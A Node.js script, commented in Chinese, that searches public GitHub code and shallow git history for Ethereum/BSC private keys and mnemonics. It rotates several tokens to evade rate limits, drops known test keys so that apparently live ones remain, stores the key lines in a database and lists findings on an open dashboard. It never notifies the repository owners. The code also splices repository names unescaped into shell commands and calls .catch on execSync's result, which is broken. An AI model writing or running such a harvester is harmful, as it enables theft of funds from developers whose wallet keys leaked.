#!/usr/bin/env node
// scanner-pro.js — 专业版 GitHub 私钥扫描器
// 新增: 多 Token 轮换 + Git 全历史扫描 + 扩展文件覆盖
//
// 环境变量:
//   GITHUB_TOKENS=ghp_xxx,ghp_yyy,ghp_zzz  (逗号分隔，多 Token 并发)
//   GITHUB_TOKEN=ghp_xxx  (单 Token 兼容)
//   SCAN_INTERVAL=300

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const { execSync } = require('child_process');
const { ethers } = require('ethers');

const PORT = process.env.PORT || 3000;
const SCAN_INTERVAL = parseInt(process.env.SCAN_INTERVAL || '300') * 1000;
const DB_PATH = path.join(__dirname, 'findings-pro.db');
const TMP_DIR = '/tmp/gh-scanner';

// 多 Token 支持
const rawTokens = process.env.GITHUB_TOKENS || process.env.GITHUB_TOKEN || '';
const TOKENS = rawTokens.split(',').map(t => t.trim()).filter(Boolean);
const TOKEN_COUNT = TOKENS.length;
let tokenIdx = 0;
function nextToken() { const t = TOKENS[tokenIdx % TOKEN_COUNT]; tokenIdx++; return t; }
function getHeaders() {
  const t = nextToken();
  return { 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'scanner-pro', ...(t ? { 'Authorization': 'token ' + t } : {}) };
}

const sleep = ms => new Promise(r => setTimeout(r, ms));
const hash = s => crypto.createHash('sha256').update(String(s)).digest('hex').slice(0, 16);

// ===== DB =====
let SQL, db;
async function getDB() {
  if (db) return db;
  SQL = await require('sql.js')();
  db = fs.existsSync(DB_PATH) ? new SQL.Database(fs.readFileSync(DB_PATH)) : new SQL.Database();
  db.run(`CREATE TABLE IF NOT EXISTS findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT, type TEXT, severity TEXT, repo TEXT, file_path TEXT,
    file_url TEXT, line_num INTEGER, secret_hash TEXT UNIQUE, context TEXT,
    confidence TEXT, stars INTEGER, method TEXT, found_at TEXT DEFAULT (datetime('now'))
  )`);
  db.run('CREATE INDEX IF NOT EXISTS idx_type ON findings(type)');
  db.run('CREATE INDEX IF NOT EXISTS idx_method ON findings(method)');
  db.run('CREATE INDEX IF NOT EXISTS idx_repo ON findings(repo)');
  saveDB();
  return db;
}
function saveDB() { if (db) fs.writeFileSync(DB_PATH, Buffer.from(db.export())); }
function runSQL(s, p = []) { try { db.run(s, p); saveDB(); return true; } catch(e) { return false; } }
function queryAll(s, p = []) { try { const st = db.prepare(s); st.bind(p); const r = []; while(st.step()) r.push(st.getAsObject()); st.free(); return r; } catch(e) { return []; } }
function queryOne(s, p = []) { return queryAll(s, p)[0] || null; }

// ===== 私钥提取 =====
const TEST_ADDRS = new Set([
  '0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266', '0x70997970c51812dc3a010c7d01b50e0d17dc79c8',
]);
const TEST_CTX = /hardhat|ganache|truffle|testrpc|test\.account|example\.key|demo\.key|documentation example/i;

function extractKeys(content, repo, file) {
  const keys = [];
  const lines = content.split('\n');
  const kw = /(?:private.?key|secret.?key|mnemonic|wallet.?key|deploy.?key|PRIVATE_KEY|SECRET|MNEMONIC|WALLET_KEY)/i;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const ctx = [lines[i-1]||'', line, lines[i+1]||''].join(' ');
    if (!kw.test(ctx)) continue;

    const hexMatches = line.match(/(?:0x)?[a-fA-F0-9]{64}/g);
    if (!hexMatches) continue;

    for (const h of hexMatches) {
      let pk = h.startsWith('0x') ? h : '0x' + h;
      if (pk.length !== 66 || /^0x(0{64}|f{64})$/i.test(pk)) continue;
      try {
        const w = new ethers.Wallet(pk);
        if (TEST_ADDRS.has(w.address.toLowerCase())) continue;
        if (TEST_CTX.test(ctx)) continue;
        keys.push({ pk, address: w.address, repo, file, line: i+1, context: line.trim().slice(0, 300) });
      } catch(e) {}
    }
  }
  return keys;
}

// ===== API =====
function apiGet(urlPath) {
  return new Promise(resolve => {
    const h = getHeaders();
    https.get('https://api.github.com' + urlPath, { headers: h }, res => {
      const remaining = res.headers['x-ratelimit-remaining'];
      const reset = res.headers['x-ratelimit-reset'];
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => {
        try { resolve({ data: JSON.parse(d), remaining: parseInt(remaining) || 0, reset: parseInt(reset) || 0 }); }
        catch(e) { resolve({ data: null, remaining: parseInt(remaining) || 0, reset: 0 }); }
      });
    }).on('error', () => resolve({ data: null, remaining: 0 }));
  });
}

async function apiGetWithRetry(urlPath) {
  const result = await apiGet(urlPath);
  if (result.remaining === 0) {
    const wait = Math.max(0, result.reset - Math.floor(Date.now()/1000)) + 2;
    console.log('  Rate limit, switching token/waiting ' + wait + 's');
    // 换下一个 token
    nextToken();
    if (wait < 60) { await sleep(wait * 1000); return apiGet(urlPath); }
    return { data: null };
  }
  return result;
}

// ===== 1. 代码搜索 =====
const SEARCH_QUERIES = [
  'PRIVATE_KEY=0x', 'privateKey: 0x language:javascript', 'privateKey = 0x language:typescript',
  'PRIVATE_KEY language:python', 'PRIVATE_KEY language:go', 'PRIVATE_KEY language:rust',
  'PRIVATE_KEY= extension:env', 'MNEMONIC= extension:env', 'SECRET_KEY= extension:env',
  'const privateKey = 0x language:javascript', 'var privateKey = 0x language:javascript',
  'WALLET_PRIVATE_KEY=', 'DEPLOY_PRIVATE_KEY=', 'PRIVATE_KEY language:solidity',
  'privateKey: 0x language:python', 'private_key = 0x language:python',
];

async function scanSearch(callback) {
  let found = 0;
  for (const q of SEARCH_QUERIES) {
    const result = await apiGetWithRetry('/search/code?q=' + encodeURIComponent(q) + '&per_page=30&sort=indexed');
    if (!result.data?.items) continue;

    const reposToClone = [];
    for (const item of result.data.items) {
      await sleep(150);
      const fileResult = await apiGetWithRetry(item.url.replace('https://api.github.com', ''));
      if (!fileResult.data?.content) continue;

      const content = Buffer.from(fileResult.data.content, 'base64').toString('utf-8');
      const keys = extractKeys(content, item.repository.full_name, item.path);

      for (const k of keys) {
        const ok = runSQL('INSERT OR IGNORE INTO findings (type,severity,repo,file_path,file_url,line_num,secret_hash,context,confidence,method,stars) VALUES (?,?,?,?,?,?,?,?,?,?,?)',
          ['ETH/BSC私钥', 'critical', k.repo, k.file, item.html_url, k.line, hash(k.pk), k.context, 'high', 'code-search', item.repository.stargazers_count || 0]);
        if (ok) { found++; callback?.({ type: 'search', repo: k.repo, address: k.address }); }
      }
      reposToClone.push(item.repository);
    }
    await sleep(500);
  }
  return found;
}

// ===== 2. 高价值仓库全历史扫描 =====
async function scanRepoHistory(repoFullName) {
  try {
    fs.mkdirSync(TMP_DIR, { recursive: true });
    const dir = path.join(TMP_DIR, repoFullName.replace(/\//g, '_')) + '_' + Date.now();
    const cloneUrl = 'https://github.com/' + repoFullName + '.git';

    execSync('git clone --depth 50 "' + cloneUrl + '" "' + dir + '" 2>/dev/null || true', { timeout: 30000 });
    if (!fs.existsSync(dir) || !fs.existsSync(path.join(dir, '.git'))) return 0;

    // 扫描所有文件
    const allFiles = findFiles(dir);
    let newKeys = 0;
    for (const file of allFiles.slice(0, 30)) {
      try {
        const content = fs.readFileSync(file, 'utf-8');
        if (content.length > 500000) continue; // skip huge files
        const keys = extractKeys(content, repoFullName, path.relative(dir, file));
        for (const k of keys) {
          const ok = runSQL('INSERT OR IGNORE INTO findings (type,severity,repo,file_path,line_num,secret_hash,context,confidence,method) VALUES (?,?,?,?,?,?,?,?,?)',
            ['ETH/BSC私钥', 'critical', k.repo, k.file, k.line, hash(k.pk), k.context, 'high', 'git-history']);
          if (ok) newKeys++;
        }
      } catch(e) {}
    }

    // 扫描 git diff 历史（查找已删除的私钥）
    try {
      const diff = execSync('cd "' + dir + '" && git log --all --diff-filter=D -p -- "*.js" "*.ts" "*.py" "*.go" "*.sol" "*.env" "*.json" "*.yml" "*.yaml" "*.txt" 2>/dev/null | head -50000',
        { timeout: 15000, encoding: 'utf-8', maxBuffer: 5 * 1024 * 1024 }).catch(() => '');
      if (diff && diff.length > 0) {
        const addedLines = diff.match(/^\+.*$/gm) || [];
        for (const line of addedLines) {
          const keys = extractKeys(line, repoFullName, '(deleted)');
          for (const k of keys) {
            const ok = runSQL('INSERT OR IGNORE INTO findings (type,severity,repo,file_path,line_num,secret_hash,context,confidence,method) VALUES (?,?,?,?,?,?,?,?,?)',
              ['ETH/BSC私钥', 'critical', k.repo, '(git-history-deleted)', 0, hash(k.pk), k.context.slice(0, 300), 'medium', 'git-deleted']);
            if (ok) newKeys++;
          }
        }
      }
    } catch(e) {}

    execSync('rm -rf "' + dir + '"', { timeout: 5000 });
    return newKeys;
  } catch(e) { return 0; }
}

function findFiles(dir) {
  const results = [];
  const extSet = new Set(['.env','.js','.ts','.py','.go','.rs','.java','.sol','.json','.yml','.yaml','.txt','.config','.sh','.bashrc','.zshrc','Makefile','Dockerfile','docker-compose.yml']);
  try {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      if (e.isDirectory() && !e.name.startsWith('.') && e.name !== 'node_modules' && e.name !== '.git') {
        results.push(...findFiles(path.join(dir, e.name)));
      } else if (e.isFile()) {
        if (extSet.has(path.extname(e.name)) || extSet.has(e.name) || /\.env\./.test(e.name)) {
          results.push(path.join(dir, e.name));
        }
      }
    }
  } catch(e) {}
  return results;
}

// ===== 3. 精选高价值仓库做全历史扫描 =====
async function scanHighValueRepos() {
  // 从已有 findings 中提取 stars > 0 的仓库
  const repos = queryAll("SELECT DISTINCT repo FROM findings WHERE stars > 0 AND method='code-search' LIMIT 30");
  let found = 0;
  for (const r of repos) {
    console.log('  Git history scan: ' + r.repo);
    const n = await scanRepoHistory(r.repo);
    found += n;
    if (n > 0) console.log('    Found ' + n + ' keys in history');
    await sleep(1000);
  }
  return found;
}

// ===== 调度 =====
let scanStats = { phase: 'idle', currentQuery: '', search: 0, git: 0, total: 0, lastScan: null };

async function runFullScan() {
  scanStats.phase = 'search'; scanStats.currentQuery = 'Code Search API';
  const s = await scanSearch();
  scanStats.search += s;

  scanStats.phase = 'git-history'; scanStats.currentQuery = 'Git Full History';
  const g = await scanHighValueRepos();
  scanStats.git += g;

  scanStats.total = queryOne('SELECT COUNT(*) as c FROM findings')?.c || 0;
  scanStats.lastScan = new Date().toISOString();
  scanStats.phase = 'idle';
  console.log('Scan done: search=' + s + ' git-history=' + g + ' total=' + scanStats.total);
}

// ===== Web =====
function serveHTML() {
  const total = queryOne('SELECT COUNT(*) as c FROM findings')?.c || 0;
  const byMethod = queryAll('SELECT method, COUNT(*) as c FROM findings GROUP BY method ORDER BY c DESC');
  const recent = queryAll('SELECT * FROM findings ORDER BY id DESC LIMIT 50');
  const methods = queryAll("SELECT method, COUNT(*) as c FROM findings GROUP BY method");

  const mRows = methods.map(m => '<span style="margin:0 8px;font-size:12px;color:#6aa7ff">' + m.method + ': ' + m.c + '</span>').join('');

  const rows = recent.map(k => '<tr><td>' + k.repo + '</td><td>' + (k.file_path || '').slice(-40) + '</td><td>' + ((k.context || '...').slice(0, 60)) + '</td><td><span style="color:#f7b955">' + k.method + '</span></td><td>' + (k.found_at || '').slice(0, 16) + '</td></tr>').join('');

  return '<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>GitHub Scanner PRO</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:system-ui,monospace;background:#0a0a0f;color:#e0e4ec;padding:20px}h1{font-size:22px}.sub{color:#6b7280;font-size:13px;margin:4px 0 20px}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:16px}.stat{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:14px 18px}.stat .l{font-size:11px;color:#7f889b}.stat .v{font-size:24px;font-weight:700;margin-top:4px;color:#ef4444}.stat .v.g{color:#22c55e}table{width:100%;font-size:12px;border-collapse:collapse}th{color:#7f889b;text-align:left;padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.08)}td{padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.04)}.addr{font-family:monospace;font-size:11px}</style></head><body><h1>GitHub Scanner PRO</h1><div class="sub">多Token并发 | Git全历史扫描 | 代码搜索 | ' + TOKEN_COUNT + '个Token</div><div class="stats"><div class="stat"><div class="l">总私钥</div><div class="v">' + total + '</div></div><div class="stat"><div class="l">代码搜索</div><div class="v g">' + scanStats.search + '</div></div><div class="stat"><div class="l">Git历史</div><div class="v g">' + scanStats.git + '</div></div><div class="stat"><div class="l">方法分布</div><div class="v" style="font-size:12px">' + mRows + '</div></div></div><table><thead><tr><th>地址</th><th>仓库</th><th>文件</th><th>方法</th><th>时间</th></tr></thead><tbody>' + (rows || '<tr><td colspan="5" style="color:#6b7280;text-align:center;padding:40px">扫描中...</td></tr>') + '</tbody></table></body></html>';
}

// ===== 启动 =====
(async () => {
  await getDB();
  console.log('Scanner PRO | Tokens: ' + TOKEN_COUNT + ' | DB: ' + DB_PATH);
  if (TOKEN_COUNT === 0) console.log('WARNING: No GitHub token!');

  http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const url = new URL(req.url, 'http://localhost');
    if (url.pathname === '/') { res.writeHead(200, {'Content-Type':'text/html;charset=utf-8'}); res.end(serveHTML()); return; }
    if (url.pathname === '/scan') { runFullScan(); res.writeHead(200, {'Content-Type':'application/json'}); res.end('{"ok":true}'); return; }
    if (url.pathname === '/api/stats') { res.writeHead(200, {'Content-Type':'application/json'}); res.end(JSON.stringify({ total: queryOne('SELECT COUNT(*) as c FROM findings')?.c || 0, ...scanStats })); return; }
    if (url.pathname === '/health') { res.writeHead(200); res.end('OK'); return; }
    res.writeHead(404); res.end();
  }).listen(PORT, '0.0.0.0', () => console.log('Web on port ' + PORT));

  setTimeout(() => runFullScan(), 5000);
  setInterval(() => runFullScan(), SCAN_INTERVAL);
})();
